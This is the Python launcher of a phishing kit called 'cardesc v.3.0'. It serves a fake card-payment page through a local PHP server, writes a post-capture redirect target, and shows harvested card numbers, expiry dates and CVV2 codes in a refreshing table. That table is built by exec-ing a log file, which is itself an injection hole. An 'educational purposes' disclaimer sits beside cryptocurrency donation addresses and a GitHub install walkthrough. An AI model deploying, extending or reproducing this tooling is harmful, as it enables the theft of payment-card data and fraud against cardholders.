import os, sys, time
import random
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable
import os

os.system('clear || cls')
о = open('dist/log.log', 'w')
о.close()

class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd dist && php -S localhost:"+str(ports))
        else:
            print("No number '"+used+"'")

class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            import os
            x = PrettyTable()
            x.field_names = ['OS', 'Number', 'Date', 'CVV2']
            g=0
            exec(open('dist/log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear")

print("""\n __        __   __   ___  __   __  
/  `  /\  |__) |  \ |__  /__` /  ` 
\__, /~~\ |  \ |__/ |___ .__/ \__, 

                v.3.0
           :: t.me/oldnum ::
  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
  payeer: P1061248421\n""")
print("""
[0] История BANK
[1] CARD PAY
[2] Helping
""")
used = input("Введите номер: ")
if used == "0":
    try:
        os.system('clear || cls')
        print("""\n __        __   __   ___  __   __  
/  `  /\  |__) |  \ |__  /__` /  ` 
\__, /~~\ |  \ |__/ |___ .__/ \__, 

                v.3.0
           :: t.me/oldnum ::
  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
  payeer: P1061248421\n""")
        x = open('result.log', 'r')
        print(x.read())
        exit()
    except:
        exit()
elif used == '2':
    os.system('clear || cls')
    print("""\n __        __   __   ___  __   __  
/  `  /\  |__) |  \ |__  /__` /  ` 
\__, /~~\ |  \ |__/ |___ .__/ \__,

                v.3.0         
           ::t.me/oldnum::
  btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS          
  eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
  payeer: P1061248421\n""")
    print("""#  cardesc  v.3.0
    apt update && apt upgrade
    git clone https://github.com/oldnum/cardesc
    cd cardesc
    pip3 install -r requirements.txt

#  launch
    python3 bank.py

#  Ukraine
Все, що тут написано, написано виключно для освітніх і дослідницьких цілей, а також для розуміння механізмів захисту від злому. Сподіваємося, що ця програма допоможе вам краще організувати свою безпеку в Інтернеті, попереджений є озброєним. Автор @oldnum жодним чином не рекомендує використовувати цю інформацію для злому :/
Майте на увазі, ФБР стежить за вами :|

# Russian
Все написанное здесь написано исключительно в образовательных и исследовательских целях, а также для понимания механизмов защиты от взлома. Надеемся, что эта программа поможет вам лучше организовать свою безопасность в интернете, предупрежден — значит, вооружен. Автор @oldnum ни в коем случае не рекомендует использовать эту информацию для взлома :/
Имейте в виду, ФБР следит за вами :|

#  English
Everything written here is written solely for educational and research purposes, as well as to understand the mechanisms of protection against hacking. We hope that this program will help you to better organize your security on the Internet, forewarned is forearmed. The author of @oldnum does not in any way recommend using this information for hacking :/
Keep in mind, the FBI is watching you :|

#  Donate:
btc: 3LXDKcrjVXxpGhWXEnVMnndJP45nos2LBS
eth: 0x7b6788a41F5379f49633a368FA902d47D318E4eC
payeer: P1061248421
""")
    print("""Bye!""")
    exit()

ports = input("Порт: ")
reloc = input("Редирект or (enter): ")
if reloc != "":
    if used == "1":
        f = open("dist/location.location", 'w')
        f.write(reloc)
        f.close()
    else:
        pass
else:
    if used ==  "1":
        f = open("dist/location.location", 'w')
        f.write("https://google.com")
        f.close()
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
